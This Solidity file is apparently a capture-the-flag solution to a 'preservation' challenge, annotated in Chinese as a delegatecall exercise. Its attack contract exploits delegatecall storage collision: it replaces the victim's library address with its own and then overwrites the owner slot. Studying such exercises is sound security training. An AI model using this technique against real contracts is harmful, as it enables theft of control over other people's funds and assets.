pragma solidity ^0.6.0;
/// @knowledgePoint delegatecall调用出错

/// @level 普通
/// @description 尝试着去获取owner

import "./perservation.sol";
contract attack {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;
    Check public check;
    TimeZone public timeZone;

    function setTime(uint _time) public {
        owner = address(_time);
    }

    constructor(address _check) public {
        check = Check(_check);
        timeZone = check.timeZone();
        timeZone.setFirstTime(uint256(uint160(address(this))));
    }

    function exp(address _check) public {
        timeZone.setFirstTime(uint256(uint160(address(this))));
        check.isCompleted();
    }
}
